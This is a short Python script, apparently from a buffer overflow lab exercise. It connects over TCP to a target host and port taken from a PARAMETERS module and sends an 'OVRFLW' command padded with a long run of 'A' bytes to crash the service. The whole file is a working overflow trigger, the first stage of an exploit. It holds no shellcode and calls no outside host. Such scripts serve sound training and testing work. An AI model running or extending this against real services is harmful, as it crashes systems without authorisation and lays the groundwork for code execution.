#!/usr/bin/env python3
import socket

from PARAMETERS import *


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = b""
#buf += b"Python Script"
buf += b"A"*buf_totlen
buf += b"\n"

s.send(b"OVRFLW " + buf + b"\n")
